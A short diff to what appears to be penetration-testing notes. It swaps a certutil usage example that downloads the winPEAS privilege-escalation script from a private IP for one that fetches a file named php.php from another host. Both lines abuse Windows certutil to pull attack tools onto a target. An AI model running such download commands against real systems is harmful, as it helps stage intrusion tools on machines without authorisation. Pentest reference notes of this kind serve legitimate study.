@@ -5,5 +5,5 @@ tags:
 ---
 ## usage:
 ```sh
-certutil -urlcache -f http://10.21.154.145:8084/winPEAS.bat winPEAS.bat
+certutil -urlcache -f http://10.250.180.7:80/php.php php.php
 ```
